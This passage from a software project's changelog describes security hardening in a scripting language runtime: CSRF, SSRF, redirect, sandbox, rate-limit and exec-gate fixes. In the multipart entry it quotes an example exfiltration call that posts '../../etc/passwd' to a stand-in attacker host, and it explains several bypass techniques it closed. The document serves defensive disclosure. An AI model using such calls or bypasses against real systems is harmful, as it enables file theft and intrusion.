`METALOGOS_ENV_ALLOWLIST` among the danger flags and prints a `[serve] route env:` state line (ENABLED — all variables / denied / allowlist: <names>) next to the №253 route-exec line (`src/main.rs`). Breaking for serve routes that read env vars (allowed pre-1.0 — owner decision on naryad №253-A, issue #256). Migration: add the variables your routes must read to `METALOGOS_ENV_ALLOWLIST="NAME1,NAME2"`, or set `METALOGOS_SERVE_ALLOW_ENV=1` where route bodies may read the whole environment. Tests: 7 in `tests/naryad_259_env_gate.rs` (TW+VM denial without flags with the code and both flag names; allowlist positive TW+VM with the soft-empty read preserved for an unset allowed name; allow-all flag; process-context regression — reads as before with no flags and is unaffected by a set allowlist; direct `env_gate` unit table — exact allowlist matching, no prefix hits, trim/empty-element handling, empty = deny, Process always Ok). E2E probe on the built binary: 500 + `ENV_NOT_PERMITTED` without flags, 200 with the allowlist. Merged as PR #294 (PR number ≠ naryad number).

### Changed — security(server): rate-limit keyed by connection peer; bounded state maps (Naryad #263)

- security(server): `extract_client_ip` trusted spoofable `X-Forwarded-For`/`X-Real-IP` unconditionally — any client could rotate the header per request and get a fresh rate-limit bucket every time (the limit counted only honest clients); the real peer address was never consulted (`ConnectInfo` was not wired into the service). Now the rate-limit key is the connection peer address by default; `X-Forwarded-For`/`X-Real-IP` are honored ONLY when `METALOGOS_TRUSTED_PROXIES` is set (comma-separated exact IPs or /NN CIDR prefixes, no new dependencies — same octet-range technique as the №261 SSRF ranges): the header is accepted only from a trusted direct peer, and the LEFTMOST entry is taken (the closest client's claim — documented loudly in REFERENCE §5.6). `rate_limit: N` is a server-declaration field now (grammar + parser + AST; default `DEFAULT_RATE_LIMIT_PER_MINUTE = 100`, unchanged default) instead of a hardcoded call argument. State maps are bounded: `MAX_SESSIONS = 10 000` (read-side cache in front of SQLite), `MAX_CSRF_TOKENS = 10 000` (15-minute TTL), `MAX_RATE_KEYS = 65 536` — at the cap a new entry is refused loudly (429/503, reason in the message) instead of unbounded memory growth; the csrf-sweep task now also evicts stale rate-limit buckets (older than the window) and expired sessions (revisit: per-server session TTL constant). Breaking for deployments behind a proxy without `METALOGOS_TRUSTED_PROXIES` (they will now be limited as one peer — set the variable). Tests: 5 HTTP-level in `tests/naryad_263_rate_limit_xff.rs` (429 on the 101st same-peer request; XFF ignored without the variable; key from XFF with the variable + trusted peer; cap refusal loud; sweep eviction). Merged as PR #293.

### Fixed — security(server): CSRF accepts only server-issued tokens; the session binding now works (Naryad #262)

- security(server): `check_csrf` (`src/server.rs`) accepted a CSRF token the server NEVER issued: when the `_mlog_csrf` cookie matched the `X-CSRF-Token` header, a token absent from the server-side store was accepted anyway (`.unwrap_or(false)` on the TTL lookup plus an explicit «stateless double-submit client» comment) — the classic naive double-submit bypass: an attacker able to plant a cookie (subdomain injection) sends ANY matching cookie+header pair and passes (external audit 2026-09-11, issue #278). The stateless fallback is REMOVED: the token must be present in `csrf_tokens` (issued by this process); absence → 403 «CSRF token validation failed» + audit entry. «Server restarted» is now an honest 403 with a token re-issue on page reload — UX degradation bounded, not a hole. The dead half of the stored tuple works since this naryad: at issuance the token is recorded with the HMAC-verified session id of the issuing request (route_handler step 3 identity, `""` when sessionless), and validation compares it with the request's session — mismatch → 403 «CSRF session binding mismatch» + audit entry. Honest boundaries, pinned by tests: a token issued WITHOUT a session is bound to `""` and stays valid only for sessionless requests (a request whose session cookie fails HMAC verification counts as sessionless — the same treatment it gets everywhere else in the pipeline); a bound token presented with a valid-signature but expired/deleted session still passes CSRF — binding proves WHO the token belongs to, session liveness stays with the session middleware step that runs right after the CSRF check. TTL 15 minutes unchanged (Naryad #29 §2.2); issuance mechanics unchanged (№125: no HttpOnly — JS reads the cookie for double-submit). Tests: +6 unit in `src/server.rs` (never-issued pair → 403 with audit, binding match passes, foreign session → 403 + audit, bound token without session → 403, sessionless token with session → 403, expired TTL → 403) + 5 HTTP tests in `tests/naryad_262_csrf_strict.rs` (never-issued pair → 403 — the pre-№262 200 regression; issued token → 200; a token of ANOTHER server instance — restart simulation — → 403; sessionless token + validly signed foreign session → 403 with negative control; sessionless token + garbage session cookie → 200, the documented boundary). Merged as PR #291 (PR number ≠ naryad number).

### Fixed — language: immutability contract enforced on every backend — `mlog check` errors, the compiler refuses, the VM never silently assigns (Naryad #264)

- language: the `let mut` contract (Naryad #14, REFERENCE §3.2, `examples/p30_assign_immutable` + `.error`) had exactly one enforcing backend: `mlog check` answered «OK: no issues found.» on a program with `let x = 10` / `x = 20`, `mlog run` (tree-walking) rejected it at runtime — and `mlog compile` + `mlog run x.mbc` SILENTLY printed `20` with exit 0 (external audit 2026-09-11, issue #280; three backends, three answers, the VM quietly violating the contract). Three roots fixed: (1) `src/semantic.rs` — new static immutability pass over pattern and route bodies mirroring the TW model EXACTLY (a flat never-popped set of `let mut` names; params and `each`/`each i, x` loop variables are immutable; assignment to a never-declared name reports the same message — TW checks mutability before resolving the name), so `mlog check` now rejects with the TW template text «cannot assign to immutable variable: x (use 'let mut x' to make it mutable)» — the `.error` contract file (TW channel) keeps matching verbatim; (2) `src/compiler.rs` — the compiler knows mut-ness at compile time, so an assignment to a non-`let mut` name (a local, a global, or an unknown name — TW errors on all three identically) is a COMPILE ERROR before serialization: a program the semantics reject can no longer be compiled into a silently-executing .mbc, and route bodies get the same check at server startup; (3) the VM backstop — assignments travel as a new `StoreAssignLocal { slot, name, mutable }` instruction carrying the immutability fact as instruction metadata, and `mutable: false` on the wire fails LOUDLY with the same text (bytecode produced past the check — hand-crafted or future compiler regressions — never silently overwrites the slot again). `.mbc` schema untouched (Program fields unchanged per the №250 precedent): the opcode is appended at the END of the `Instruction` enum, so old .mbc files deserialize and run identically; an OLD binary reading NEW bytecode fails loudly at deserialize time (unknown variant index), never silently. Honest residual, pinned by a test: PRE-№264 .mbc artifacts encode assignments as plain `StoreLocal` — byte-identical to a second `let` binding (the compiler reuses the slot on re-`let`, and TW itself allows `let x = 10; let x = 20` on an immutable), so a sound VM-side detection without the metadata flag is impossible without false-positiving legitimate legacy bytecode; such old artifacts keep running as before. Corpus scan: no example contains a non-`mut` assignment (`p30_assign_immutable.mlog` is the designed `.error` contract); the `let mut` path is green on check/TW/VM (negative control). Tests: `tests/naryad_264_immutability.rs` — 10 (probe-fact inverted on check, TW contract unchanged, compile loud, TW/VM parity on one source, VM backstop on a past-check .mbc round-trip, `let mut` control on all backends, each-var immutability + TW leak model mirror, param immutability, route-body enforcement on both paths, legacy StoreLocal compat). Docs: REFERENCE §3.2 marks the contract as statically enforced. Merged as PR #289 (PR number ≠ naryad number).

### Changed — security(http): 3xx redirects are no longer followed by the http_* builtins (Naryad #261 — breaking)

- security(http): `http_get`, `http_post`, `http_post_multipart`, `http_download` followed 3xx redirects silently (reqwest's default policy, up to 10 hops) — and every hop re-resolved DNS WITHOUT re-running the SSRF pin, so a single redirect turned the №130 resolve-pinning into a no-op (pin `host-a`, hop to an attacker's `host-b`; the `Authorization` header leaked cross-host on the way). All four egress builtins now build their clients with `reqwest::redirect::Policy::none()`: a 3xx response is returned AS-IS — the 3xx body is the return value for `http_get`/`http_post`/`http_post_multipart` (status < 400 is not an error) and the written file content for `http_download`. Security-by-design: following a redirect is now the program's EXPLICIT decision — read `Location`, make a second http_* call, and that call goes through the SSRF gate and redirect policy again. Breaking for programs that relied on transparent redirect following (allowed pre-1.0 — owner decision on naryad №253-A, issue #256). Migration: issue a second call to the URL from the `Location` header yourself (it will be SSRF-gated and redirect-free), or handle the 3xx body/status explicitly. Automatic redirect following WITH per-hop DNS re-pinning — revisit on a real use case. Tests: `tests/naryad_261_ssrf_pack.rs` — a local-bind 302 server: `http_get`/`http_post` return the 302 body verbatim and `/final` is never requested; `http_download` writes the 302 body and does not follow. Merged as PR #287 (PR number ≠ naryad number).

### Fixed — security(http): http_download is behind the SSRF gate; blocked-address classes widened (Naryad #261)

- security(http): `http_download(url, dest_path)` built its own `reqwest::blocking::Client` and sent the request DIRECTLY — `apply_ssrf_resolves` was NOT called (unlike http_get/http_post/http_post_multipart), so `127.0.0.1`/`10.0.0.0`/`169.254.169.254` downloaded happily without `METALOGOS_HTTP_ALLOW_PRIVATE=1` (external audit 2026-09-11, issue #277; the IO side was closed by №252, the egress side was open). Now the URL goes through the same gate with DNS resolve pinning. A gate refusal is a LOUD error carrying `SSRF guard ...` (parity with http_get: a policy refusal is not a "network failed" case, so the soft contract must not swallow it); network/write failures KEEP the boolean soft-failure contract `Ok(false)` (№76/№252, unchanged — the dest-path sandbox violation also stays soft `Ok(false)`, as documented in the №252 entry). Address classes widened in the SSOT `is_blocked_address` (hardens every consumer: `check_url_ssrf` for all http_* builtins, `vision_fetch_weights`, and the static `MODEL_WEIGHTS_UNSAFE` gate): IPv4-mapped IPv6 (`::ffff:10.0.0.5`, `::ffff:169.254.169.254` — the V6 branch now unwraps `to_ipv4_mapped()` and re-runs the full V4 checks), unspecified `0.0.0.0`/`::`, CGNAT `100.64.0.0/10` (RFC 6598) and benchmark `198.18.0.0/15` (RFC 2544) — explicit octet-range checks (std ships no helpers). Tests: `tests/naryad_261_ssrf_pack.rs` — 11 tests: unit table for mapped/unspecified/CGNAT/benchmark with exact bounds (neighbors above/below stay allowed), legacy №130/№150 classes regression, URL-level gate on a CGNAT literal, redirect non-following for get/post/download, download loud-without-flag and works-with-flag on a local bind. Merged as PR #287 (PR number ≠ naryad number).

### Fixed — security(http): file reads in http_post_multipart go through the sandbox (Naryad #260)

- security(http): `http_post_multipart(url, fields, files)` read every file field with `std::fs::read(path)` on the RAW path from the program argument — the only builtin file read outside the sandbox (read_file/delete_file/http_download all go through it; external audit 2026-09-11, issue #276). Any route/template that let an untrusted string reach the third argument became an exfiltration primitive: `http_post_multipart("https://evil.example", {}, {"f": "../../etc/passwd"})` sent an arbitrary host file to the program's URL (the outgoing URL was SSRF-gated since №130 — the files it carried were not). Now every file path is resolved through `sandbox_path_ex(path, SandboxMode::ForRead)` (SSOT `src/builtins/io.rs`) BEFORE the client is built; a sandbox violation — absolute path, `..`, symlink escape, unresolvable path — is a LOUD error `http_post_multipart(): [SANDBOX_VIOLATION] file I/O sandbox: ...` (№252/№254 convention; the code rides in the error text until the mlog-check diagnostic registry lands). Relative in-sandbox paths keep working (the "send a file the program created" case is unbroken) and the actual read uses the canonical path (№252: safe-to-use, not the original string). A missing file was already an error and stays one (now loud `cannot resolve path` instead of `No such file or directory` at the OS read). Docs: REFERENCE.md http-builtins table + multipart example switched to a sandbox-relative path (README has no http-builtins section — loud deviation from naryad №260 §3 wording, same treatment as №254). Tests: `tests/naryad_260_multipart_sandbox.rs` — traversal/absolute/symlink-escape are loud with the code; an in-sandbox file is actually delivered through a local `127.0.0.1:0` receiver (no external network; `METALOGOS_HTTP_ALLOW_PRIVATE=1` under an env mutex, value restored after).
### Fixed — server: query_param percent-decoding corrupted every non-ASCII value — RFC 3986 byte reassembly (Naryad #257)

- server: `url_decode_fallback` pushed each decoded byte as a standalone `char`, so `%D0%B6` ("ж") produced mojibake `Ð¶` — every non-ASCII `query_param()` value was silently corrupted for end users (external audit 2026-09-11, issue #260; the decoder feeds query parsing for ALL routes, TW and VM alike). The decoder now collects BYTES and decodes the result as UTF-8 lossily: `%D0%B6` → `"ж"`, invalid byte sequences yield U+FFFD, decoding never fails. Documented choices (each pinned by a test): invalid escapes (`%ZZ`, `%G1`) and a truncated `%` pass through literally — a deliberate deviation from strict RFC rejection (query parsing must not fail on user input); `+` decodes to space (the `application/x-www-form-urlencoded` convention — HTML forms and axum tooling; send a literal `+` as `%2B`); decoding is single-pass (`%25D0%25B6` → `%D0%B6`). No new dependency: the `percent-encoding` crate was considered and rejected after the byte-reassembly fix made the manual decoder trivially correct (dependency discipline). Tests: `tests/naryad_257_rfc3986.rs` — 10, including the naryad's exact edge table and an end-to-end serve test (`GET /hi?name=%D0%96...` → `hi Женя`); regressions server_json_body 8/8, vm_serve_realistic 7/7, naryad_161 3/3. REFERENCE §4.13 documents the decoding behavior and the `query_param` row points at it. Merged as PR #285 (PR number ≠ naryad number).

### Added — fuzz: real targets for the .mbc load path and the url decoder (Naryad #256 — parts A+B)

- fuzz: only `fuzz_target_1` (parser::parse) existed — the `.mbc` load path and the query-string percent-decoder, both fed by external bytes, had zero fuzz coverage, and CI never fuzzed (external audit 2026-09-11, issue #259). New targets: `fuzz_target_bytecode` — arbitrary bytes through `Program::deserialize` (the exact call `mlog run file.mbc` makes: bincode legacy + the №146 size limit; contract: Ok or loud Err, never a panic/hang; malicious-bytecode DISPATCH is intentionally not executed — the VM has no step-budget API, an infinite loop would hang the fuzzer; revisit when one lands); `fuzz_target_url_decode` — `url_decode_fallback` (now `pub`, the fuzz surface) with panic-freedom on any UTF-8 input + ASCII roundtrip; the NON-ASCII roundtrip is deliberately not asserted (the decoder reassembles bytes as chars — multibyte UTF-8 yields mojibake; that RFC 3986 correctness question is naryad №257's deliverable). `fuzz/Cargo.lock` committed for reproducible fuzz deps. PART B — the fuzz-smoke CI job (nightly + cargo-fuzz, 120s/target) — landed as PR #296: the owner's fresh session token carries the `workflow` scope, so the ready-to-apply block from PR #284 was applied verbatim, with one documented §8.4 edit — the executor's comment «blocking count 14 -> 16» truth-up'd to «15 -> 16» (branch-freshness joined the blocking set in PR #292). The job is NON-blocking by design: a 16th BLOCKING job would break the blocking-count invariant across README/docs — promotion is an owner decision. Merged as PR #284 (part A; PR number ≠ naryad number); part B as PR #296.

### Added — server: explicit 2 MiB request body limit instead of the implicit axum default (Naryad #255)

- server: the request body limit is now an explicit, owned constant — `REQUEST_BODY_LIMIT_BYTES = 2 MiB` (2 097 152 bytes, `src/server.rs`), applied via `DefaultBodyLimit::max` in `build_router` (TW and VM backends alike; larger bodies get HTTP 413 Payload Too Large). Before №255 the cap was axum 0.8's implicit ~2 MB default — the source of truth lived in a foreign crate and would silently change on an upgrade, and neither threat-model nor REFERENCE answered "what is the max request size". Justification recorded in the constant's doc comment: 2 MiB fits JSON route bodies (configs, documents, LLM payloads); bigger uploads are a separate decision (streaming/multipart), not a silent ride along a dependency upgrade. Docs: threat-model (Runtime Protections) + REFERENCE §4.13 name the exact number; pinned by `tests/naryad_255_body_limit.rs` (real HTTP stack: N−1 → 200, N+1 → 413). Merged as PR #283 (PR number ≠ naryad number).

### Fixed — io: sandbox violations are loud [SANDBOX_VIOLATION] — read_file/delete_file no longer mask them (Naryad #254)

- io: `read_file("../secrets")` behaved identically to `read_file("typo.txt")` — any `sandbox_path` error became an empty string, silently swallowing programmer defects (external audit 2026-09-11, issue #257). Now the outcomes are split: a missing-or-unreadable path keeps the soft-failure contract (empty string, unchanged); a sandbox violation — absolute path, `..`, symlink escape, broken symlink — is a loud error carrying the stable code `SANDBOX_VIOLATION` (ADR-0131 convention; the code rides in the error text until the mlog-check diagnostic registry lands — loud deviation, same as №253). Classification lives in `sandbox_path_missing` (`src/builtins/io.rs`): textual violations are always loud; `symlink_metadata` failure (no such path / parent not traversable) is the soft case; an existing path (including a broken-symlink link itself) rejected by canonicalize/prefix is a violation — №131 rejections become loud instead of silent. `write_file`/`append_file` were loud since №252 — their errors now carry the code too (`sandbox_path_ex` + the escape/unresolvable arms of `open_sandbox_write`); OS-level write errors stay soft. `delete_file` gets the same split as `read_file`. `file_exists`/`list_dir` behavior unchanged (outside the naryad's named scope — decision recorded in PR). Docs: REFERENCE.md io-builtins table (README has no io-builtin section — loud deviation). Tests: +8 unit (`io::tests_n254`), +8 integration (`tests/naryad_254_sandbox_violation.rs`); io unit suite 27/27 (n131/n252 unbroken); `#[ignore]` delta 0. Merged as PR #273 (PR number ≠ naryad number).

### Fixed — security(io): write-path symlink TOCTOU — canonical return + two-phase O_NOFOLLOW open (Naryad #252)

- security(io): write-path symlink TOCTOU closed (planted-final-component escape, issue #255). Root cause: `sandbox_path_ex` validated the canonical path but returned the ORIGINAL string — the actual write re-traversed any symlink planted between the check and the use. Mechanics: `sandbox_path_ex` now returns a path that is safe to USE, not merely checked — `ForRead` returns the canonicalized file path (in-sandbox symlink reads still resolve — the sandbox is not a symlink ban), `ForWrite` returns `<canonical parent>/<final component>` with the parent prefix-verified; the new `open_sandbox_write` (`src/builtins/io.rs`) closes the final-component race with a two-phase open: `create_new` (fresh creation is atomic — no symlink can sit there) → on `AlreadyExists` canonicalize the full path, re-verify the sandbox prefix, reopen the CANONICAL path with `O_NOFOLLOW` (unix; on non-unix step 2 opens the canonical path without O_NOFOLLOW — documented boundary, symlink creation there requires elevated privileges). Honest boundary recorded in code: intermediate directory components swapped between canonicalize and open remain out of scope (would need per-component O_NOFOLLOW or Linux openat2 RESOLVE_BENEATH — revisit on a real use case). `http_download` (the third ForWrite site, `src/builtins/http.rs`) is closed by the same helper — its boolean soft-failure contract is unchanged (`Ok(false)` on any failure). Tests: 7 new in `src/builtins/io.rs` (`tests_n252`, unix-gated where planted symlinks are the repro'd class; full `write_file`/`append_file` call chains exercised, not just `sandbox_path_ex`): write/append through a planted symlink denied with the outside file untouched, broken-symlink write loud, directory write loud, in-sandbox symlink read still OK, new+overwrite+append regular-file path OK, canonical ForWrite return shape pinned. Merged as PR #261 (PR number ≠ naryad number).

### Changed — security(io): file-write sandbox violations are now loud errors (Naryad #252 — breaking)

- security(io): `write_file`/`append_file` — violating the file sandbox is now a LOUD error (`file I/O sandbox: ...` — escape past the sandbox base, unresolvable target, path with no file name; these errors also carry the stable code `SANDBOX_VIOLATION` since naryad #254, PR #273) instead of the silent soft-failure that returned an empty string; ordinary OS-level write errors KEEP the soft-failure contract (empty string) — sandbox violations are programmer errors, OS failures are environmental. Breaking for code that relied on the silent refusal (allowed pre-1.0 — owner decision on naryad #253 Variant A, issue #256; PR number ≠ naryad number). Migration: check return values / handle the error text instead of treating the empty result as the only failure mode. `http_download` keeps its boolean soft-failure contract (`Ok(false)` on any failure, sandbox violation included — the helper's loud error is consumed internally there; loud deviation from naryad №258's prescribed wording, which grouped http_download into the loud change — the merged PR #261 code documents the unchanged contract in place). Merged as PR #261.

### Changed — security: exec in serve route handlers gated by METALOGOS_SERVE_ALLOW_EXEC (Naryad #253, Variant A — breaking)

- security: `exec()`/`exec_argv()` in serve route bodies now require `METALOGOS_SERVE_ALLOW_EXEC=1` — route handlers no longer inherit the process-level `METALOGOS_ALLOW_EXEC` flag (replacement semantics, not AND; owner decision 2026-09-11, issue #256). Before this change, `mlog serve` with `METALOGOS_ALLOW_EXEC=1` gave every route handler a full `sh -c` — route code (frequently authored or generated by someone else) silently inherited the operator's shell pass. Mechanics: the gate duplicated in `exec`/`exec_argv` since №97 is collapsed into the SSOT `exec_gate(context)` (`src/builtins/io.rs`); a thread-local RAII `ServeRouteExecGuard` is set inside the spawn_blocking closures of BOTH route paths (`execute_route_body`, `execute_route_body_vm` in `src/server.rs`) — TW and VM backends are gated identically, while serve top-level (route registration) and `mlog run`/`check` keep the №97 process-flag behavior unchanged. Denials carry the stable diagnostic code `EXEC_NOT_PERMITTED` (ADR-0131 naming convention; the code rides in the error text until the mlog-check diagnostic registry lands — loud deviation, noted in the PR) and name the exact flag of the current context. The serve banner lists `METALOGOS_SERVE_ALLOW_EXEC=1` among danger flags and prints `route exec: ENABLED / denied` at startup (`src/main.rs`). Every allowed invocation is recorded in the subprocess audit log (`METALOGOS_AUDIT_LOG_PATH`). `exec_restricted` (html_render, pdf) intentionally stays flag-free: fixed binary, arguments built from code, never from request bodies (closure pinned by tests). Tests: 8 new in `tests/naryad_253_exec_gate.rs` (denial without flags TW+VM; the essence-of-A case — process flag set, still denied; serve-flag enables exec + audit record; process context unchanged; gate replacement-semantics unit; registry closure); n88 html_render contract 13/13. Docs: threat-model (Runtime Protections → exec gates), SECURITY.md, README (Runtime exec gates). Migration: set `METALOGOS_SERVE_ALLOW_EXEC=1` where route bodies must call `exec()`. Breaking by design — allowed pre-1.0; merged as PR #271 (PR number ≠ naryad number).

### Fixed — vm: route bodies dispatch user patterns with TW parity (Naryad #250, closes ADR-0122 #208)

- vm: route bodies dispatch user patterns with TW parity (query_param/json_body/respond) — closes ADR-0122 #208; 28 tests un-ignored. Four stacked roots repro'd then fixed: (1) the serve path never registered patterns — `load_program` now pre-registers them by scanning main_code's `RegisterPattern` instructions (index order 1:1, old-.mbc safe) and the handler is index-stable (rposition replace-in-place); (2) templates never reached the VM path — the compiler registers them at compile time via the n115 `GLOBAL_TEMPLATES` channel (overwrite-idempotent; Program schema frozen; .mbc-templates residual loud); (3) route bodies lost their value to the fall-through (a trailing ExprStmt `Pop` made `execute_code` return a leftover local — "hi" instead of the HttpResponse) — final-Pop suppression gives the TW semantics (body value = last statement's value); (4) bool literals compiled to `Float(1.0/0.0)` (VM `sort` diverged from TW on mixed lists) — now `Const(Value::Bool)`, .mbc format unchanged; plus the designed "404 Not Found" body was never wired into the axum router — a backend-agnostic `.fallback` added (TW/VM parity kept). Un-ignore 28 of the planned 31 (loud): vm_golden's 2 stay (their full-corpus blockers — match-in-VM and candle-gated reflex examples — are outside the naryad's §3); 1 kv test returned with the accurate root (KV_STORE is process-global by design). `#[ignore]` 136→108.

### Changed — adapt quality mock 0.95: revisit point formally recorded (Naryad #247, docs-only)

- docs: adapt quality mock 0.95 — revisit point formally recorded (ADR-0112 addendum; external audit 2026-09-10), REFERENCE §5.15 honesty note. The mock value 0.95 stays in the code (rollback tests depend on it; ADR-0112: "The mock value 0.95 stays in the code") — the rollback logic is real and tested, but does not yet respond to actual quality degradation. Revisit only on a real `mutate` use case where the mock value creates a concrete problem. README §5 and REFERENCE §5.15 now mark both the mock value and the revisit point; ADR-0112 gains a "Revisit point (2026-09-10)" addendum with the current code addresses (`src/interpreter/hooks.rs:60-61`, `src/vm.rs:2946-2947`). Docs-only: zero diff in `src/**` and `tests/**`; merged as PR #250 (PR number ≠ naryad number).

### Fixed — llm: full request cancellation by deadline on all paths (Naryad #248)

- llm: full request cancellation by deadline on all paths — legacy backend thread-wrapper replaced with `call_with_deadline` (README/REFERENCE promise closed; external audit 2026-09-10). The `LlmBackend` trait gains `call_with_deadline` (default → `call_with_model`, existing impls compatible): RealLlm builds a one-shot client with timeout = min(deadline, 120s) — a real TCP drop at the deadline (no retry loop, single attempt per deadline); MockLlm sleeps min(delay, deadline) and fails loudly when the deadline is tighter. The legacy `Some(timeout)` path in `learnable.rs` now calls the backend directly — the abandoned-thread wrapper (`thread::spawn` + `recv_timeout`, which left the HTTP request in flight) is removed together with its Disconnected arm. SmartRouter path (№156) unchanged. The README/REFERENCE caveat was rewritten to match the actual behavior; the `AbortHandle` promise is withdrawn as fulfilled (external on-demand abort remains out of scope — revisit on a real use case). Proven by a local accept-and-hang server test that observes the server-side TCP close at the deadline; naryad_126 semantics preserved 1:1 with no test edits; no new `#[ignore]`.

### Fixed — test: serialize session-memory contract tests — global store race (№239 family, 2nd round, Naryad #251)

- test: serialize session-memory contract tests — global store race (№239 family, 2nd round). All 10 `tests/session_memory_contract.rs` tests hold one poison-tolerant static mutex for the whole test body (template: `naryad_244_vision_lora.rs` `env_lock`); evidence: 2 CI failures 2026-09-10, `left: 0, right: 1` at `:204` (`contract_session_no_persistence`); test-only — `src/**`, deps, CI settings untouched; 30/30 consecutive green runs.

### Changed — security SSOT sync (Naryad #246, docs-only)

- docs: security SSOT sync — threat-model (Vision gates + `db_execute` in the SQL row + honest provenance boundary), SECURITY.md (0.19.x supported, generative-pillars paragraph), ADR-0122 truth-up (#213/#214 delivered, owner gate 2026-09-09), go-no-go gate line, README honest line.

### Added — Vision R6.3: LoRA adapters — SQLite BLOB + application to DiT (Naryad #244)

- **`vision_lora_load(name, path) -> String` (Block 2.2)**: reads a
  safetensors adapter ONCE from a file and persists it in the program's
  DB (`db { url: "sqlite:..." }`) — the `vision_lora_adapters` table (name
  TEXT PK / bytes BLOB NOT NULL / meta_json TEXT NOT NULL / saved_at
  RFC 3339). **ADR-0124 section 6: the adapter lives ONLY in an SQLite
  BLOB — not a new file format, not session state** (`VisionRegistry` is
  untouched). The order of loud checks is prescribed: arity/types → no-db
  (a hint pointing at `db { url: ... }`) → `MLOG_VISION_WEIGHTS_DIR` →
  path safety (relative, no `..`, the `.safetensors` extension,
  the file exists — reading is allowed ONLY inside
  weights_dir, no new file-reading surface; the contract function is
  `vision_lora_check_adapter_path`, modeled on `vision_edit_check_dims_r41`)
  → the feature gate (without `vision` = a loud refusal: validation requires
  candle, inserting unverified bytes would be silent garbage — forbidden)
  → reading + parsing + validation → `lora_save`. A name collision = a loud
  Err (no upsert, modeled on #242); returns the persistent key `name`.
- **`vision_lora_generate(decl_name, prompt, lora_name) -> Vision`
  (Block 2.3)**: the full `vision_generate` pipeline with the
  adapter applied. Prescribed order: arity/types → an empty prompt →
  resolving the decl (with a list of the declared ones) → re-checking model ∈
  `KNOWN_VISION_MODELS` → no-db / unknown `lora_name` = Err (with
  `lora_list`) → [gated] reading bytes from the DB plus **integrity**:
  `sha256(bytes) ≠ meta.sha256` = a loud Err BEFORE any compute → the
  Block 1.1 parse → env gates + components → the fixed 1024×1024 → the pipeline.
  `meta_json` is the fixed `LoraMeta` structure (sha256/rank/alpha/
  scale/targets); malformed JSON = a loud Err (modeled on #242).
- **`src/vision/lora.rs` (Block 1.1)**: parsing safetensors bytes
  (`candle_core::safetensors::load_buffer`, a reader modeled on Stage B/C).
  BOTH canonical naming forms are accepted — diffusers-PEFT
  (`<target>.lora_A.weight` / `.lora_B.weight`) and ComfyUI
  (`<target>.lora_down.weight` / `.lora_up.weight` plus an optional
  `<target>.alpha`); mixing forms within one target = a loud Err.
  `rank` is the average dimension; `scale = alpha/rank`; a missing alpha
  gives `scale = 1.0` with a loud eprintln note (in the style of #243's
  quant_conv); a non-F32 input is upcast to F32 LOUDLY. Validation: the
  target, after stripping its suffix, must be an
  attention projection of the base
  (`layers.N`/`noise_refiner.N`/`context_refiner.N` x
  `to_q/to_k/to_v/to_out.0` per `zimage_expected_keys`); a non-attention
  target (norms/FFN/embedders/final), an unknown prefix, a B with no A (and
  vice versa), orphaned keys, mismatched dimensions — ALL of these are loud
  Errs with a FULL list of the problems. Silently dropping keys is forbidden.
- **Merging into the DiT (Block 1.2)**: `ZImageTransformer::from_weights_with_lora`
  (dit.rs, additive) — the base is built by the untouched `from_weights`, then
  `merge_lora_in_place` runs per target: `W' = W + scale·(up@down)` in F32
  with a cast back to the base dtype; a deterministic (sorted) order of
  targets; a missing base or an index beyond n_layers = a loud Err. **A bit-exact
  obligation (Block 1.3)**: `from_weights`/`forward`/`forward_edit`/
  `new_tiny` — zero diff; the merge is called ONLY on the lora path;
  a control invariant: a zero up OR down means the output is byte-for-byte
  equal to the base (verified at both the weight and output level). **The wedge
  goldens of #212 stay green with NO edits** (85ef6a87/860c85b3).
- **Composite provenance (Block 2.4)**: when an adapter is applied,
  `model_sha256 = sha256("{base}\nlora:{name}:{lora_sha256}")`, where
  `base = weights_tree_sha256(weights_dir)` (may be "unpinned" — the
  composite is honest above the marker too), `lora_sha256` is the SHA of the
  adapter's bytes from the DB; `model_id` is the base from the decl; the
  watermark is the base model (the adapter is a delta, not the model). The
  formula is fixed in the code at its computation site
  (`vision_lora_composite_model_sha256`, pub — mechanically pinned by a
  test, precedent `verify_sha_pin`) and is mirrored in REFERENCE section 4.22
  and the doc comment on `VisionManifest::model_sha256` (the provenance
  structure/code is untouched — the 7 fields are not extended).
- **Intercepts x3 plus stubs plus taint (Blocks 2.5/2.6/3)**: `vision_lora_load`
  (db_conn) and `vision_lora_generate` (decls plus registry plus db_conn) in the
  interpreter (eval + invoke) and the VM; last-resort stubs
  `builtin_vision_lora_load_stub`/`builtin_vision_lora_generate_stub` —
  modeled on export_raw_stub (doc reference "R6.3, #244");
  `spec!` lines after `vision_load`, arities
  2 and 3. Taint: the positional check on arg 1 is extended to
  `vision_lora_generate` — the same check-id `VISION_PROMPT_USER_INPUT`
  (Warning; arg 0's decl name and arg 2's lora name are not flagged; no
  new check-ids/categories, and #241's gates are untouched).
- **Registry 389 → 391; THE FAMILY CEILING IS REACHED**: there are
  now 10 vision builtins (generate 2 / edit 2 / export 2 / export_raw 2 /
  fetch_weights 2 / list 0 / save 2 / load 1 / lora_load 2 /
  lora_generate 3) — the top of ADR-0124 section 3's predefined bound
  ("Expected family size: ~8-10 — a hard counter against builtins
  bloat"). **The next vision builtin requires amending ADR-0124** — loudly.
- **Tests (Block 4.1, no network/weights, no `#[ignore]`)**: 21 tiny
  contracts in `tests/naryad_244_vision_lora.rs` (parsing both forms,
  parse negatives with a full list, merging changes the tiny DiT's
  output, a zero adapter's byte-for-byte identity, determinism of two
  full tiny runs (merge → sample → tiny VAE → PNG) bit-for-bit, a store
  round trip/collision/malformed meta (a direct UPDATE), integrity SHA,
  dispatch negatives for lora_load/lora_generate, the signature: 7 fields
  plus the composite structure plus the watermark plus the policy from
  the decl; a minimal safetensors blob is built with candle's own writer —
  the API is available, no deviation). Merge unit contracts (a direct
  matmul on the weights, identity weights, out-of-range/missing base) are
  in `src/vision/dit.rs` (`mod lora_tests`). `tests/naryad_240_vision_dispatch.rs`
  is extended (+3 taint tests: arg 1 is flagged, arg 0/arg 2 are not, a
  literal is not flagged), as is
  `tests/naryad_210_vision_skeleton.rs` (+2 real-path tests: a no-db
  lora_load, an arity-3 lora_generate; 11 → 13 tests). The runbook gets
  section 3.2, a lora e2e (a PARKED run, the owner places the adapter in
  `weights_dir/lora/…`).
- **The wedge goldens of #212, weights.rs, the weights manifest (16 files /
  32,848,304,654 B), `tools/fetch_vision_weights.sh`, grammar.pest,
  `KNOWN_VISION_MODELS`, #242's store contract (`vision_artifacts`),
  `VisionRegistry`, ADR-0124 — untouched.**


### Added — Vision R6.2: `vision_edit` — in-context editing (Naryad #243)

- **`vision_edit(handle, prompt) -> Vision` (Block 2)**: the loud R1 stub
